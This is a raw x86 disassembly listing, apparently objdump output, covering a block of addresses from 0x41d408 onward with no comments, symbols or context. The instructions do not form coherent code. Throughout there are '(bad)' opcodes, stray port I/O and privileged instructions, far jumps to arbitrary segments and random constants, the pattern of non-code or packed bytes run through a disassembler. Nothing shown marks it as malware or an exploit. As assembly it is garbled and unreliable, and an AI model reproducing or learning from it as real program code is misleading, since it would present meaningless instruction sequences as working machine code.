  41d408:	mov    ss,WORD PTR [edx-0x4]
  41d40b:	cs push ds
  41d40d:	and    eax,0x4ef2bf7e
  41d412:	sub    ebx,esp
  41d414:	dec    ebp
  41d415:	and    DWORD PTR [ebp-0x44c79ee8],edx
  41d41b:	mov    bl,0xd
  41d41d:	jns    0x41d3ca
  41d41f:	sub    ch,0x4b
  41d422:	cmc    
  41d423:	cs dec edx
  41d425:	and    eax,0x6212fc28
  41d42a:	mov    bl,0x3e
  41d42c:	mov    ah,bh
  41d42e:	adc    al,0xd0
  41d430:	pop    ebp
  41d431:	fcmovnbe st,st(7)
  41d433:	pop    ebp
  41d434:	mov    ds:0x46a7571a,eax
  41d439:	stc    
  41d43a:	mov    ebx,?
  41d43c:	icebp  
  41d43d:	lahf   
  41d43e:	aaa    
  41d43f:	in     eax,dx
  41d440:	sbb    BYTE PTR [edi-0x582056a9],dh
  41d446:	mov    edi,0x2387f4d0
  41d44b:	jb     0x41d492
  41d44d:	xor    edi,esp
  41d44f:	cmp    eax,0xe2be234c
  41d454:	stc    
  41d455:	popa   
  41d456:	popa   
  41d457:	lods   al,BYTE PTR ds:[esi]
  41d458:	push   bp
  41d45a:	xchg   edx,eax
  41d45b:	or     esp,DWORD PTR ds:0x56c1a6ab
  41d461:	dec    DWORD PTR [edx-0x50e99ca1]
  41d467:	dec    ebp
  41d468:	retf   0xea4e
  41d46b:	shl    DWORD PTR [ebx-0x4630f15f],cl
  41d471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d472:	pop    esi
  41d473:	mov    ds:0x4d56ddf0,al
  41d478:	mov    edx,esi
  41d47a:	and    ch,BYTE PTR [ebx]
  41d47c:	or     al,0x61
  41d47e:	pop    es
  41d47f:	push   ebp
  41d481:	push   eax
  41d482:	div    eax
  41d484:	mov    esp,0xf55dde47
  41d489:	(bad)  
  41d48a:	loopne 0x41d501
  41d48c:	mov    ah,0xa3
  41d48e:	sub    DWORD PTR [ebx+0x54],ebx
  41d491:	xor    dl,BYTE PTR [ebp+eiz*2-0x1d]
  41d495:	lods   al,BYTE PTR ds:[esi]
  41d496:	(bad)  
  41d498:	mov    dh,0x17
  41d49a:	stos   BYTE PTR es:[edi],al
  41d49b:	and    eax,0xd8c2bfe4
  41d4a0:	icebp  
  41d4a1:	xchg   BYTE PTR [ebp-0x25],dh
  41d4a4:	loope  0x41d4fa
  41d4a6:	add    al,0x5f
  41d4a8:	cmp    cl,BYTE PTR [esi-0x4e]
  41d4ab:	loope  0x41d4e6
  41d4ad:	mov    ecx,0xc8fdfacf
  41d4b2:	das    
  41d4b3:	adc    cl,BYTE PTR [ebp+0x78]
  41d4b6:	add    eax,0x62ff1145
  41d4bb:	std    
  41d4bc:	enter  0x9afa,0x1c
  41d4c0:	sbb    ah,BYTE PTR [ecx]
  41d4c2:	int3   
  41d4c3:	(bad)  
  41d4c4:	lods   eax,DWORD PTR ds:[esi]
  41d4c5:	out    0x58,al
  41d4c7:	loop   0x41d520
  41d4c9:	push   es
  41d4ca:	jb     0x41d483
  41d4cc:	push   ebp
  41d4cd:	scas   eax,DWORD PTR es:[edi]
  41d4ce:	inc    edx
  41d4cf:	xor    edx,DWORD PTR [esi+0x4d]
  41d4d2:	mov    edi,0x90a99ead
  41d4d7:	lds    esi,FWORD PTR [ebp-0x214174e6]
  41d4dd:	dec    eax
  41d4de:	ret    
  41d4df:	fucomp st(7)
  41d4e1:	mov    ebp,0x43107d4b
  41d4e6:	mov    edi,0xb073e1fa
  41d4eb:	push   ecx
  41d4ec:	cli    
  41d4ed:	mov    ecx,0xc5365697
  41d4f2:	cli    
  41d4f3:	sub    eax,0xcf5cfde
  41d4f8:	shl    BYTE PTR [edi-0x44a3d166],cl
  41d4fe:	mov    ds:0x268e4f8b,eax
  41d503:	jle    0x41d566
  41d505:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41d507:	rol    DWORD PTR [edx+0x72],1
  41d50a:	in     al,dx
  41d50b:	ds jne 0x41d542
  41d50e:	dec    ebp
  41d50f:	int3   
  41d510:	push   ecx
  41d511:	pop    ecx
  41d512:	loope  0x41d547
  41d514:	inc    esi
  41d515:	jae    0x41d555
  41d517:	bound  ecx,QWORD PTR [eax-0x3a0a9f66]
  41d51d:	cmp    DWORD PTR [ecx],edi
  41d51f:	int    0x7f
  41d521:	pushf  
  41d522:	(bad)  
  41d523:	sbb    BYTE PTR [eax-0x4ca9977f],ah
  41d529:	ds cld 
  41d52b:	cmp    dl,BYTE PTR [bx+di]
  41d52e:	rol    BYTE PTR [esi+0x32],cl
  41d531:	mov    edi,0x3b8667ed
  41d536:	sub    BYTE PTR [edx-0x69],0xe0
  41d53a:	lahf   
  41d53b:	xor    eax,0x2a32713e
  41d540:	rcr    BYTE PTR [ebx],cl
  41d542:	and    dh,BYTE PTR [ebx]
  41d544:	daa    
  41d545:	cmp    al,BYTE PTR [ebx]
  41d547:	cmp    eax,0xf6f2d756
  41d54c:	retf   
  41d54d:	jb     0x41d510
  41d54f:	pop    ebp
  41d550:	mov    eax,ds:0x76f79713
  41d555:	jmp    0x81e:0xefd8edd5
  41d55c:	cmp    cl,BYTE PTR [edx-0x57a93c56]
  41d562:	shr    DWORD PTR [ecx+0x5c9e8e36],0xca
  41d569:	dec    edx
  41d56a:	sti    
  41d56b:	and    BYTE PTR [ebp+0x6308c770],bl
  41d571:	or     eax,0xdaa32975
  41d576:	in     eax,dx
  41d577:	aaa    
  41d578:	clc    
  41d579:	mov    DWORD PTR [edx-0x251a6482],ebp
  41d57f:	cmp    eax,DWORD PTR [edi+0x36]
  41d582:	in     al,0xdf
  41d584:	idiv   BYTE PTR [ecx-0x6a]
  41d587:	icebp  
  41d588:	fpatan 
  41d58a:	cmc    
  41d58b:	pop    ecx
  41d58c:	sub    BYTE PTR [ecx+0x75],cl
  41d58f:	cs jg  0x41d5e7
  41d592:	push   ss
  41d593:	ds imul ecx
  41d596:	mov    WORD PTR [ebx+0x2e730e41],ss
  41d59c:	mov    bl,BYTE PTR [esi-0x23]
  41d59f:	mov    esi,0xa62cee93
  41d5a4:	daa    
  41d5a5:	pop    ecx
  41d5a6:	mov    ds:0xb4bfbfda,eax
  41d5ab:	ds push ecx
  41d5ad:	inc    sp
  41d5af:	and    ebp,esi
  41d5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b2:	xor    edi,DWORD PTR [edx+0x1]
  41d5b5:	and    bl,BYTE PTR [esi]
  41d5b7:	sbb    ah,BYTE PTR [ecx]
  41d5b9:	mov    edx,0xd80314ea
  41d5be:	jnp    0x41d63e
  41d5c0:	fld    TBYTE PTR [edx-0xe8d8f87]
  41d5c6:	dec    eax
  41d5c7:	jge    0x41d588
  41d5c9:	mov    al,ds:0x3668389d
  41d5ce:	nop
  41d5cf:	ins    DWORD PTR es:[edi],dx
  41d5d0:	add    eax,0x70999fd8
  41d5d5:	xchg   esp,eax
  41d5d6:	push   0xffffffa3
  41d5d8:	int    0x43
  41d5da:	sar    BYTE PTR [esi+0x1a],1
  41d5dd:	lahf   
  41d5de:	test   ch,dh
  41d5e0:	mov    ds:0x86a9d717,al
  41d5e5:	ret    0xcd79
  41d5e8:	adc    ch,dl
  41d5ea:	adc    ebp,DWORD PTR [esi]
  41d5ec:	addr16 int 0xc2
  41d5ef:	ret    0xed2f
  41d5f2:	ss in  al,dx
  41d5f4:	add    BYTE PTR [eax-0x2d],bh
  41d5f7:	shr    BYTE PTR [ebp-0x7c292eb7],1
  41d5fd:	ret    
  41d5fe:	jno    0x41d5b3
  41d600:	dec    esp
  41d601:	enter  0x77fc,0x5b
  41d605:	pop    eax
  41d606:	push   ds
  41d607:	cld    
  41d608:	(bad)  
  41d609:	push   ebp
  41d60a:	jl     0x41d5ad
  41d60c:	add    eax,0x82626a30
  41d611:	xor    ecx,DWORD PTR [edi]
  41d613:	out    0xa1,eax
  41d615:	(bad)  
  41d616:	push   ebp
  41d617:	or     eax,0x2c62d41b
  41d61c:	pop    esp
  41d61d:	xchg   ebx,eax
  41d61e:	stc    
  41d61f:	pop    cx
  41d621:	icebp  
  41d622:	ins    BYTE PTR es:[edi],dx
  41d623:	xor    eax,0xa823e12d
  41d628:	cmc    
  41d629:	pop    eax
  41d62a:	ins    BYTE PTR es:[edi],dx
  41d62b:	or     bh,BYTE PTR [eax]
  41d62d:	sbb    al,0xa3
  41d62f:	mov    edi,gs
  41d631:	test   al,0x1a
  41d633:	cmp    al,0x6f
  41d635:	fsub   DWORD PTR [edx+0x47]
  41d638:	std    
  41d639:	dec    ecx
  41d63a:	lods   eax,DWORD PTR ds:[esi]
  41d63b:	lods   al,BYTE PTR ds:[esi]
  41d63c:	push   ss
  41d63d:	jb     0x41d5de
  41d63f:	sar    BYTE PTR [ebx-0x43],0xd1
  41d643:	in     al,0x74
  41d645:	lahf   
  41d646:	dec    ecx
  41d647:	(bad)  
  41d648:	jb     0x41d6a8
  41d64a:	bound  esp,QWORD PTR [ebp+0x4f5a84da]
  41d650:	test   BYTE PTR [esi],ch
  41d652:	inc    edi
  41d653:	push   0x57
  41d655:	dec    ecx
  41d656:	data16 sbb bl,BYTE PTR gs:[ecx]
  41d65a:	jmp    0x41d6cf
  41d65c:	mov    bl,0xd6
  41d65e:	mov    bl,0xc1
  41d660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d661:	pop    ecx
  41d662:	sti    
  41d663:	cwde   
  41d664:	test   eax,0xcde78909
  41d669:	or     bh,BYTE PTR [ecx-0x108c4944]
  41d66f:	mov    edi,edx
  41d671:	pop    ebp
  41d672:	ss out 0xb3,al
  41d675:	fnstsw WORD PTR [edx+0x1fecd1bb]
  41d67b:	jmp    0x41d61d
  41d67d:	push   ebx
  41d67e:	pop    ebx
  41d67f:	pushf  
  41d680:	jbe    0x41d6b7
  41d682:	cmp    al,0x23
  41d684:	mov    ebx,0xf5f69174
  41d689:	add    cl,bl
  41d68b:	xchg   edi,eax
  41d68c:	clc    
  41d68d:	push   cs
  41d68e:	xor    al,0x9d
  41d690:	cli    
  41d691:	call   0xf739ffb8
  41d696:	pop    esp
  41d697:	inc    eax
  41d698:	clc    
  41d699:	int3   
  41d69a:	ja     0x41d6cd
  41d69c:	sahf   
  41d69d:	push   0xf7504cd2
  41d6a2:	dec    eax
  41d6a3:	aam    0x5a
  41d6a5:	and    dh,0xad
  41d6a8:	sbb    al,bh
  41d6aa:	rcr    DWORD PTR [ebx-0x57e0626e],cl
  41d6b0:	and    dl,BYTE PTR [edi+0x73]
  41d6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b4:	pop    esi
  41d6b5:	popf   
  41d6b6:	dec    esp
  41d6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6b8:	rcr    BYTE PTR [edi-0x41d705a2],1
  41d6be:	or     eax,0x61b981fd
  41d6c3:	adc    eax,0xf8712947
  41d6c8:	lahf   
  41d6c9:	dec    eax
  41d6ca:	stos   BYTE PTR es:[edi],al
  41d6cb:	dec    ebx
  41d6cc:	add    ebp,DWORD PTR [esi]
  41d6ce:	and    eax,0x78311b8
  41d6d3:	enter  0x586e,0x50
  41d6d7:	not    eax
  41d6d9:	add    esp,DWORD PTR [eax+0x3a]
  41d6dc:	hlt    
  41d6dd:	retf   
  41d6de:	nop
  41d6df:	pop    eax
  41d6e0:	sbb    al,0xc0
  41d6e2:	jecxz  0x41d6f2
  41d6e4:	dec    esi
  41d6e5:	jnp    0x41d6ea
  41d6e7:	dec    BYTE PTR cs:[ebx-0x6b]
  41d6eb:	mov    bh,0x48
  41d6ed:	push   edi
  41d6ee:	mov    esp,DWORD PTR [ecx]
  41d6f0:	and    al,0xa2
  41d6f2:	fwait
  41d6f3:	mul    DWORD PTR ds:0x966415fe
  41d6f9:	and    eax,0x7fca2cdd
  41d6fe:	push   ebx
  41d6ff:	and    DWORD PTR [eax],eax
  41d701:	or     eax,0x43bb0f0e
  41d706:	lea    eax,[ecx-0x275a338e]
  41d70c:	xchg   BYTE PTR [eax+0x385ad0e3],bl
  41d712:	stos   DWORD PTR es:[edi],eax
  41d713:	cs popf 
  41d715:	add    DWORD PTR [edi],esi
  41d717:	jbe    0x41d6a6
  41d719:	mov    dh,0xee
  41d71b:	and    ch,0xd8
  41d71e:	sub    al,0xcf
  41d720:	(bad)  
  41d721:	dec    ecx
  41d722:	ins    BYTE PTR es:[edi],dx
  41d723:	pushf  
  41d724:	push   0x3a0d605a
  41d729:	rol    BYTE PTR [ebx+0x6f8b8fb7],cl
  41d72f:	out    dx,eax
  41d730:	leave  
  41d731:	arpl   WORD PTR ds:0xfc924a4d,bx
  41d737:	loopne 0x41d797
  41d739:	aas    
  41d73a:	or     esi,DWORD PTR [edi]
  41d73c:	repnz mul BYTE PTR [ebx+0x70]
  41d740:	mov    WORD PTR [edx-0x2b],ss
  41d743:	jl     0x41d746
  41d745:	dec    esi
  41d746:	mov    ecx,0x319a3061
  41d74b:	and    al,0x81
  41d74d:	sbb    esp,DWORD PTR [ecx*1+0xb16ec0a]
  41d754:	jl     0x41d6db
  41d756:	lock mov esp,0x4e7e3b95
  41d75c:	jb     0x41d78e
  41d75e:	mov    ch,0xce
  41d760:	clc    
  41d761:	fdivr  st,st(6)
  41d763:	iret   
  41d764:	(bad)
  41d768:	mov    ch,0xe1
  41d76a:	dec    eax
  41d76b:	push   cs
  41d76c:	neg    DWORD PTR [ebx-0x50010b5c]
  41d772:	add    DWORD PTR [edx-0x28],esi
  41d775:	mov    edi,0xbdc50410
  41d77a:	test   al,0x7f
  41d77c:	mov    ds:0x359cae85,eax
  41d781:	stos   DWORD PTR es:[edi],eax
  41d782:	and    al,0x73
  41d784:	mov    edi,0x2576217f
  41d789:	push   esp
  41d78a:	mov    bh,BYTE PTR ds:0xe894945b
  41d790:	cld    
  41d791:	retf   0x9655
  41d794:	in     eax,0xce
  41d796:	aas    
  41d797:	repnz dec esi
  41d799:	aaa    
  41d79a:	sbb    edx,DWORD PTR [ecx+0x6d2a6513]
  41d7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7a1:	icebp  
  41d7a2:	push   ds
  41d7a3:	xor    DWORD PTR [esp+ebx*4+0x3b487d5f],esi
  41d7aa:	rcl    BYTE PTR [ebx+0x3330419a],1
  41d7b0:	mov    al,0x68
  41d7b2:	mov    eax,0x15cba271
  41d7b7:	lods   eax,DWORD PTR ds:[esi]
  41d7b8:	in     eax,0xd6
  41d7ba:	jg     0x41d7aa
  41d7bc:	nop
  41d7bd:	cmp    ch,BYTE PTR [esp+ebx*2+0xe]
  41d7c1:	outs   dx,DWORD PTR ds:[esi]
  41d7c2:	cld    
  41d7c3:	dec    ecx
  41d7c4:	jo     0x41d75e
  41d7c6:	mov    ebp,0x698541f5
  41d7cb:	jmp    0x41d766
  41d7cd:	adc    ch,al
  41d7cf:	fwait
  41d7d0:	es xchg edx,eax
  41d7d2:	retf   0x156e
  41d7d5:	repz mov esp,0xb238e907
  41d7db:	sub    BYTE PTR [ecx-0x52],ah
  41d7de:	mov    BYTE PTR [esp+eiz*2-0x78a5317f],dl
  41d7e5:	sahf   
  41d7e6:	idiv   DWORD PTR [eax]
  41d7e8:	hlt    
  41d7e9:	adc    al,0x15
  41d7eb:	push   0x6f2b5a37
  41d7f0:	cmp    bl,cl
  41d7f2:	mov    DWORD PTR [ebp+ecx*8+0x20243638],0x51be2d3e
  41d7fd:	cs push ebx
  41d7ff:	stc    
  41d800:	fwait
  41d801:	or     eax,0x70d9601b
  41d806:	int    0xec
  41d808:	pop    DWORD PTR [esi-0x3f]
  41d80b:	aam    0x8c
  41d80d:	mov    al,0x6c
  41d80f:	jl     0x41d842
  41d811:	cmp    BYTE PTR [ebx-0x274a1b67],al
  41d817:	(bad)  
  41d818:	lock mov edx,0xb3790b60
  41d81e:	ds cdq 
  41d820:	cmp    esi,ecx
  41d822:	sbb    eax,esp
  41d824:	std    
  41d825:	icebp  
  41d826:	add    al,0x72
  41d828:	cmp    dh,cl
  41d82a:	cdq    
  41d82b:	int3   
  41d82c:	mov    ebp,DWORD PTR [ecx+0x352b23f9]
  41d832:	out    dx,al
  41d833:	or     eax,0xfa1d5af7
  41d838:	inc    edx
  41d839:	clc    
  41d83a:	jae    0x41d89a
  41d83c:	fdiv   st(5),st
  41d83e:	add    DWORD PTR [ecx-0x31fd7562],ebx
  41d844:	js     0x41d8a9
  41d846:	and    ecx,esi
  41d848:	fst    QWORD PTR [ebp-0x64]
  41d84b:	push   es
  41d84c:	inc    ax
  41d84e:	push   0x4d
  41d850:	imul   edx,DWORD PTR [esi+edx*4-0x4cbb69ba],0x43
  41d858:	lock cmp eax,0xf4b5762d
  41d85e:	ret    0x416e
  41d861:	enter  0xa5c5,0x32
  41d865:	mov    BYTE PTR [ecx-0x2e700fc4],ah
  41d86b:	or     edi,0x60ba4195
  41d871:	fwait
  41d872:	xchg   ecx,edi
  41d874:	push   edi
  41d875:	jl     0x41d8bf
  41d877:	hlt    
  41d878:	lock cmp DWORD PTR [ebx-0x238d3179],edi
  41d87f:	repnz in al,0x25
  41d882:	call   0xabda:0x1e6831f9
  41d889:	js     0x41d897
  41d88b:	mov    edx,DWORD PTR [ebx]
  41d88d:	mov    al,ds:0x59c49bb7
  41d892:	inc    esp
  41d893:	cmp    ax,0xe1f5
  41d897:	cmp    DWORD PTR [edi],ecx
  41d899:	aaa    
  41d89a:	pop    edx
  41d89b:	or     eax,0xe42281bd
  41d8a0:	sub    ebx,DWORD PTR [edx]
  41d8a2:	sbb    DWORD PTR [esi],ebx
  41d8a4:	mov    DWORD PTR [esi+0x12],edi
  41d8a7:	test   DWORD PTR [edi-0x5d],edi
  41d8aa:	ret    
  41d8ab:	iret   
  41d8ac:	pextrw edx,(bad),0xc5
  41d8ae:	xchg   ebx,eax
  41d8af:	push   esp
  41d8b0:	xor    BYTE PTR [esi],dl
  41d8b2:	and    ah,cl
  41d8b4:	mov    dh,0x62
  41d8b6:	outs   dx,DWORD PTR ds:[esi]
  41d8b7:	mov    esi,0xf465f075
  41d8bc:	cdq    
  41d8bd:	inc    ebx
  41d8be:	popf   
  41d8bf:	mov    ebx,0xfa2c912f
  41d8c4:	jmp    0x41d8f1
  41d8c6:	xor    al,bl
  41d8c8:	in     eax,dx
  41d8c9:	repnz arpl WORD PTR [edx],cx
  41d8cc:	test   ebx,0x19e45827
  41d8d2:	mov    dl,0x39
  41d8d4:	sub    ebp,0x58
  41d8d7:	lea    esp,[esi-0x16]
  41d8da:	sahf   
  41d8db:	push   ss
  41d8dc:	mov    edi,ebp
  41d8de:	(bad)  
  41d8df:	jnp    0x41d8fe
  41d8e1:	neg    DWORD PTR [edx]
  41d8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8e4:	out    0xe0,al
  41d8e6:	stos   BYTE PTR es:[edi],al
  41d8e7:	ret    
  41d8e8:	imul   esp,DWORD PTR [esi-0x3b],0xffffffe9
  41d8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ed:	popf   
  41d8ee:	(bad)  
  41d8ef:	sbb    ah,BYTE PTR [ebp-0x3c62134f]
  41d8f5:	sub    al,0x8
  41d8f7:	retf   
  41d8f8:	sub    eax,0x8d81fb74
  41d8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8fe:	xchg   DWORD PTR [edx],esi
  41d900:	or     al,0x3a
  41d902:	fninit 
  41d904:	lds    esi,FWORD PTR [ebp+0x5f55313a]
  41d90a:	jmp    FWORD PTR [ecx+0x2e569b40]
  41d910:	or     ch,BYTE PTR ds:0x8db37e1a
  41d916:	dec    edx
  41d917:	or     dl,BYTE PTR [ecx+edx*4+0x58]
  41d91b:	(bad)  
  41d91d:	jnp    0x41d96e
  41d91f:	js     0x41d8b1
  41d921:	mov    al,ds:0xb9683006
  41d926:	and    eax,0x3690d53f
  41d92b:	(bad)  
  41d92c:	cmc    
  41d92d:	loop   0x41d950
  41d92f:	test   esi,eax
  41d931:	and    dl,BYTE PTR [eax-0x58]
  41d934:	seto   bl
  41d937:	das    
  41d938:	mov    ebp,0xd7b75eb2
  41d93d:	ss jg  0x41d98d
  41d940:	sub    al,0xd6
  41d942:	outs   dx,BYTE PTR ds:[esi]
  41d943:	pusha  
  41d944:	mov    ds,WORD PTR [eax]
  41d946:	dec    ebp
  41d947:	xchg   DWORD PTR [eax+0x2b999734],edi
  41d94d:	mov    esp,DWORD PTR [eax+0xf]
  41d950:	dec    esp
  41d951:	push   eax
  41d952:	adc    DWORD PTR [ecx-0x51],ebp
  41d955:	inc    eax
  41d956:	js     0x41d995
  41d958:	clc    
  41d959:	inc    ecx
  41d95a:	jbe    0x41d945
  41d95c:	icebp  
  41d95d:	test   BYTE PTR [eax-0x6542e3cf],ch
  41d963:	daa    
  41d964:	push   0xffffffdb
  41d966:	adc    BYTE PTR [ecx+0x56],ch
  41d969:	add    DWORD PTR [edi+0x1a1cc8cb],0x7e168bfd
  41d973:	jb     0x41d9a7
  41d975:	pop    edi
  41d976:	jnp    0x41d9de
  41d978:	repnz (bad) 
  41d97a:	lahf   
  41d97b:	std    
  41d97c:	sbb    eax,0x4016b569
  41d981:	imul   esp,DWORD PTR [ecx],0x897553f7
  41d987:	sub    DWORD PTR [edx-0x5351d08c],edi
  41d98d:	test   BYTE PTR ds:0x392d1c54,0xa1
  41d994:	xchg   eax,edx
  41d996:	bndstx [ebx-0x5e],bnd0
  41d99a:	out    dx,eax
  41d99b:	xchg   esi,eax
  41d99c:	xor    DWORD PTR [edi+0x74],esi
  41d99f:	mov    al,ds:0xd2105e67
  41d9a4:	jmp    0x41da17
  41d9a6:	adc    bh,dl
  41d9a8:	xchg   esp,eax
  41d9a9:	xlat   BYTE PTR ds:[ebx]
  41d9aa:	sbb    ch,cl
  41d9ac:	cmp    esp,edx
  41d9ae:	dec    ecx
  41d9af:	and    esi,DWORD PTR [esi+0x42]
  41d9b2:	shr    DWORD PTR [ebx-0x2e],0x8
  41d9b6:	or     eax,DWORD PTR [edi+0x5e]
  41d9b9:	dec    edi
  41d9ba:	add    eax,0x9f1919cc
  41d9bf:	iret   
  41d9c0:	or     al,0x1e
  41d9c2:	jmp    0x41da3e
  41d9c4:	xor    al,0x59
  41d9c6:	out    0xad,eax
  41d9c8:	les    edi,FWORD PTR [esi-0x543f02f]
  41d9ce:	hlt    
  41d9cf:	add    ah,BYTE PTR [edi]
  41d9d1:	xchg   esi,eax
  41d9d2:	mov    ah,0x8
  41d9d4:	outs   dx,BYTE PTR ds:[esi]
  41d9d5:	cdq    
  41d9d6:	in     eax,dx
  41d9d7:	bound  ebp,QWORD PTR [eax+0x69e373e]
  41d9dd:	mov    edx,0xc659f2a7
  41d9e2:	jmp    0x35a4:0x9645c6ac
  41d9e9:	neg    DWORD PTR [edi+0x215c86e]
  41d9ef:	rcl    cl,1
  41d9f1:	mov    ds:0xad6ce90d,eax
  41d9f6:	jle    0x41d9e7
  41d9f8:	(bad)  
  41d9fa:	mov    edi,0x5f64b3ac
  41d9ff:	std    
  41da00:	outs   dx,DWORD PTR ds:[esi]
  41da01:	ds iret 
  41da03:	div    DWORD PTR [esi-0x7]
  41da06:	cwde   
  41da07:	mov    esp,0x1d719dfa
  41da0c:	repz jp 0x41d9bf
  41da0f:	lahf   
  41da10:	sub    DWORD PTR [ebp-0x66],eax
  41da13:	out    dx,al
  41da14:	loope  0x41da06
  41da16:	and    bl,BYTE PTR [ebx+0x2167d72b]
  41da1c:	add    bl,BYTE PTR [esi-0x234b3cb4]
  41da22:	sbb    BYTE PTR [edx],dl
  41da24:	mov    dh,BYTE PTR [ebp+0x4f]
  41da27:	js     0x41da44
  41da29:	dec    edx
  41da2a:	jns    0x41da16
  41da2c:	jmp    0x41da38
  41da2e:	stos   BYTE PTR es:[edi],al
  41da2f:	mov    ecx,0xb7465824
  41da34:	push   ss
  41da35:	lock fidivr WORD PTR [ebx+0x1d47e46]
  41da3c:	pop    ds
  41da3d:	ins    DWORD PTR es:[edi],dx
  41da3e:	mov    es,ebx
  41da40:	add    al,0x26
  41da42:	gs stc 
  41da44:	xor    edx,ecx
  41da46:	mov    ecx,0x6976aef
  41da4b:	pushf  
  41da4c:	lahf   
  41da4d:	int    0x9
  41da4f:	scas   al,BYTE PTR es:[edi]
  41da50:	or     edi,esp
  41da52:	fs pop ds
  41da54:	outs   dx,BYTE PTR ds:[esi]
  41da55:	mov    ch,0x59
  41da57:	jmp    0x41da7c
  41da59:	mov    edx,0xb782af25
  41da5e:	push   0x55b27acc
  41da63:	pop    esp
  41da64:	loopne 0x41da83
  41da66:	es out 0x37,al
  41da69:	int3   
  41da6a:	sub    dl,BYTE PTR [esi-0xa39278c]
  41da70:	test   BYTE PTR [edx*1+0x38246aa8],bh
  41da77:	jmp    0x3a41:0x2fe1d408
  41da7e:	cmp    eax,0x88ed73c5
  41da83:	push   cs
  41da84:	sbb    ah,ah
  41da86:	test   DWORD PTR [ebx-0x701def28],esp
  41da8c:	cmp    DWORD PTR ds:0x2692f3f2,esi
  41da92:	cmp    al,0xdc
  41da94:	sti    
  41da95:	lahf   
  41da96:	push   edx
  41da97:	test   ax,0xe33e
  41da9b:	mov    esi,0x2dbee9ab
  41daa0:	inc    esp
  41daa1:	sbb    al,0x12
  41daa3:	repz cmp di,0xff83
  41daa8:	push   edx
  41daa9:	add    eax,0x9d4265d2
  41daae:	inc    edx
  41daaf:	test   BYTE PTR [esi-0x5e],al
  41dab2:	popa   
  41dab3:	mov    bl,0x43
  41dab5:	in     eax,dx
  41dab6:	mov    ds:0xb65fcb9b,al
  41dabb:	les    esp,FWORD PTR [edx-0x2b505fb]
  41dac1:	test   DWORD PTR [ebx],esp
  41dac3:	repz xor cl,BYTE PTR [edx]
  41dac6:	cmp    eax,0x41dbf5f7
  41dacb:	out    dx,al
  41dacc:	xor    ebp,DWORD PTR [esi-0x66c8135b]
  41dad2:	adc    cl,dh
  41dad4:	jne    0x41db23
  41dad6:	(bad)  
  41dad7:	cmp    al,0xdf
  41dad9:	sbb    BYTE PTR ds:0x7e2e4c59,cl
  41dadf:	add    esi,ebp
  41dae1:	mov    bh,0xf7
  41dae3:	ret    
  41dae4:	sbb    DWORD PTR [ebx],edx
  41dae6:	arpl   WORD PTR [ecx-0x1a686a51],ax
  41daec:	sahf   
  41daed:	xchg   DWORD PTR [edx-0x4a8bae21],eax
  41daf3:	(bad)  
  41daf5:	cdq    
  41daf6:	xor    al,0x1a
  41daf8:	inc    edx
  41daf9:	dec    esp
  41dafa:	sar    BYTE PTR ds:0x5fb62ab0,1
  41db00:	dec    ebp
  41db01:	lds    eax,FWORD PTR [eax]
  41db03:	xor    al,0x33
  41db05:	es ja  0x41dae5
  41db08:	outs   dx,DWORD PTR ds:[esi]
  41db09:	fcom   DWORD PTR [ebx+0x73]
  41db0c:	or     BYTE PTR [ecx-0x59fec94f],ah
  41db12:	adc    al,0x7
  41db14:	lds    ebp,FWORD PTR [edi-0x64]
  41db17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db18:	and    esi,ebx
  41db1a:	xor    al,0x87
  41db1c:	mov    dh,0x44
  41db1e:	lahf   
  41db1f:	lea    edi,[ecx+0x78]
  41db22:	push   es
  41db23:	pushf  
  41db24:	fstp   TBYTE PTR [esi+0x561c9f1b]
  41db2a:	sub    al,0xc9
  41db2c:	sbb    ch,BYTE PTR [edx-0x26]
  41db2f:	and    DWORD PTR [ecx],0xffffffe7
  41db32:	retf   
  41db33:	fidiv  DWORD PTR [edx+0x67a8e5b4]
  41db39:	daa    
  41db3a:	(bad)  
  41db3b:	loop   0x41daeb
  41db3d:	mov    ch,dl
  41db3f:	mov    eax,ds:0xbc53b3b4
  41db44:	add    ah,cl
  41db46:	sub    DWORD PTR [edi],esi
  41db48:	jle    0x41db64
  41db4a:	loope  0x41dbbe
  41db4c:	rcr    DWORD PTR [edi+0x42],0x12
  41db50:	cs gs popa 
  41db53:	ins    BYTE PTR es:[edi],dx
  41db54:	pushf  
  41db55:	icebp  
  41db56:	shl    ebx,0xda
  41db59:	jns    0x41dbd9
  41db5b:	lahf   
  41db5c:	pop    esi
  41db5d:	sub    eax,DWORD PTR [edi-0x721f4f03]
  41db63:	push   es
  41db64:	das    
  41db65:	sub    ch,BYTE PTR [esi]
  41db67:	ins    DWORD PTR es:[edi],dx
  41db68:	push   eax
  41db69:	cmp    eax,0xa1b3aac9
  41db6e:	jb     0x41dbef
  41db70:	dec    edx
  41db71:	add    esp,DWORD PTR [ebx]
  41db73:	mov    al,ds:0x9b60c207
  41db78:	pop    ebp
  41db79:	int3   
  41db7a:	addr16 inc edx
  41db7c:	iret   
  41db7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db7e:	inc    edi
  41db7f:	call   0x2a7a68a3
  41db84:	push   esp
  41db85:	outs   dx,BYTE PTR ds:[esi]
  41db86:	fs jb  0x41db72
  41db89:	mov    BYTE PTR [edi],dl
  41db8b:	jne    0x41db55
  41db8d:	mov    BYTE PTR [edx-0x58],bl
  41db90:	sbb    edi,DWORD PTR [edi]
  41db92:	leave  
  41db93:	mov    ds:0xa09a6b17,eax
  41db98:	lods   eax,DWORD PTR ds:[esi]
  41db99:	aad    0xf6
  41db9b:	imul   edi,esi,0xffffffc7
  41db9e:	and    bh,cl
  41dba0:	(bad)  
  41dba1:	cmp    al,BYTE PTR [edx-0x33a8a692]
  41dba7:	popa   
  41dba8:	je     0x41dc02
  41dbaa:	or     DWORD PTR [ebx+0x29a21f4f],esp
  41dbb0:	sbb    esi,DWORD PTR [ebx-0xf0a1338]
  41dbb6:	xlat   BYTE PTR ds:[ebx]
